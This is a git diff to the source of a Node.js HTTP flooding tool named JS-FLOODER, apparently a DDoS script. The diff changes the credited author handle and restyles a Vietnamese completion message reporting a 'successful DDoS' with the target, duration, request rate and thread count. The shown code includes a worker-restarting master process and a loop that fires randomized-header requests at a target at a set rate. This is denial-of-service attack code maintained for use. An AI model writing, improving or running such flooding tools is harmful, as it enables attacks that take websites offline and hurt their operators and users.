@@ -217,7 +217,7 @@ const RESTART_DELAY = 1000;
 if (cluster.isMaster) {
   console.clear()
   console.log('JS-FLOODER | ATTACK SENT'.bgBlue);
-  console.log('@henrynet206 | NEW JS-FLOODER METHODS'.yellow);
+  console.log('@mondo0810 | NEW JS-FLOODER METHODS'.yellow);
   console.log('====================================='.gray);
   const restartScript = () => {
     for (const id in cluster.workers) {
@@ -581,7 +581,6 @@ function runFlooder() {
     client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
         for (let i = 0; i < args.Rate; i++) {
-
           const dynHeaders = {
             ...headers,
             ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
@@ -627,7 +626,11 @@ function runFlooder() {
 }
 const StopScript = () => {
   console.log(
-    `Ddos thành công web ${args.target} trong ${args.time} giây, với tốc độ ${args.Rate} requests mỗi giây và ${args.threads} luồng.`
+    '🔥 DDoS thành công! 🔥'.bold.red +
+    '\n🌐 Mục tiêu: '.bold.cyan + args.target.underline +
+    '\n⏰ Thời gian: '.bold.yellow + args.time + ' giây' +
+    '\n⚡ Tốc độ: '.bold.green + args.Rate + ' requests mỗi giây' +
+    '\n🔄 Số luồng: '.bold.magenta + args.threads + ' luồng\n'
   );
   process.exit(1)
 };
